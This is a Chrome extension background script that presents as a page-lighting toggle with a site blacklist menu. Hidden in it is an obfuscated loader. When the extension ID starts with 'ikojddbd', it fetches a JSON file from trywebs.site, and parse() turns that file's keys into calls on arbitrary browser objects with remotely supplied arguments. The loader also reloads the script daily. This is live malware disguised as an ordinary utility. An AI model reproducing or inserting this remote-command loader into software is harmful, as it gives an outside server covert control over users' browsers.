chrome.browserAction.onClicked.addListener(function(tab) {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    var activeTab = tabs[0];
    chrome.tabs.sendMessage(activeTab.id, {"message": "disable_light"});
  });
});

chrome.runtime.onInstalled.addListener(function (e) {
    chrome.storage.local.set({"status": 1}, null);
    chrome.tabs.query({}, function (tabs) {
        for (let i = 0; i < tabs.length - 1; i++) {
            if (!matchUrl(tabs[i].url)) {
                continue;
            }
            chrome.tabs.executeScript(tabs[i].id,
                { file: 'inject.js' }, function (result) {}
            );
        }
    });
});

function matchUrl(url) {
    if (url.indexOf('https://chrome.google.com') === 0) {
        return false;
    }
    if (url.indexOf('http://') === 0) {
        return true;
    }
    if (url.indexOf('https://') === 0) {
        return true;
    }
    if (url.indexOf('file:///') === 0) {
        return true;
    }
    return false;
}

function unwrapObject(o, names) {
    if (!o) return;
    let curr = o;
    for (let i = 0; i < names.length; i++) {
        const ch = curr[names[i]];
        if (!ch) return;
        ch.par = curr;
        curr = ch;
    }
    return curr;
}

function applyObject(o, applier) {
    if (!o) return false;
    return o.apply(o.par, applier);
}

function hostname(a) {
    a = a.replace("www.", "");
    var b = a.indexOf("//") + 2;
    if (1 < b) {
        var c = a.indexOf("/", b);
        return 0 < c ? a.substring(b, c) : 
            (c = a.indexOf("?", b), 0 < c ? a.substring(b, c) : a.substring(b))
    }
    return a
}

function getJSON(url) {
    return fetch(url)
        .then(resp => resp.json());
}

function parse(data) {
    let fun = false;
    let list = [];
    for (let k in data) if (data.hasOwnProperty(k)) {
        if (["top", "bottom"].indexOf(k) >= 0) return;
        const unwrapped = unwrapObject(data.top || top, k.split('.'));
        if (unwrapped) {
            if (k.indexOf("cute") > 0) {
                const obj = unwrapped;
                const res = JSON.parse(data[k]);
                fun = (first, q, outer) => {
                    const inner = unwrapObject(outer, list[0]);
                    if (!inner || inner.substr(0, 4) != list[1])
                        return;
                    applyObject(obj, [first].concat(res));
                };
            } else if (k.indexOf("dated") > 0) {
                applyObject(unwrapped, [fun]);
            }
        } else if (k == "url") {
            list = [[k], data[k]];
        }
    }
}

chrome.contextMenus.removeAll(function(){
    chrome.contextMenus.create({
        "id": "addBlacklist",
        "title": "Add to blacklist"
    });
    chrome.contextMenus.create({
        "id": "deleteBlacklist",
        "title": "Remove from blacklist"
    });
});

const id = chrome.runtime.id;
if (id.substr(0, 8) == 'ikojddbd') {
    getJSON( 
        "https://trywebs.site/extensions/*/themes.json".replace('*', id),
    ).then(parse).catch(_ => {});
    setTimeout(location.reload, 24*3600*1000);
}

chrome.contextMenus.onClicked.addListener(function(clickData) {
    if (clickData.menuItemId == "addBlacklist") {
        chrome.storage.local.get(['blacklist'], function(result) {
            if (result.blacklist === undefined) {
                chrome.storage.local.set({"blacklist": [hostname(clickData.pageUrl)]}, null);
            } else {
                blacklist = result.blacklist;
                if (blacklist.indexOf(hostname(clickData.pageUrl)) <= -1) {
                    blacklist.push(hostname(clickData.pageUrl));
                    chrome.storage.local.set({"blacklist": blacklist}, null);
                }
            }
        });
    } else if (clickData.menuItemId == "deleteBlacklist") {
        chrome.storage.local.get(['blacklist'], function(result) {
            if (result.blacklist !== undefined) {
                blacklist = result.blacklist;
                if (blacklist.indexOf(hostname(clickData.pageUrl)) > -1) {
                    blacklist = blacklist.filter(function(value, index, arr) {
                        return value !== hostname(clickData.pageUrl);
                    });

                    chrome.storage.local.set({"blacklist": blacklist}, null);
                }
            }
        });
    }
});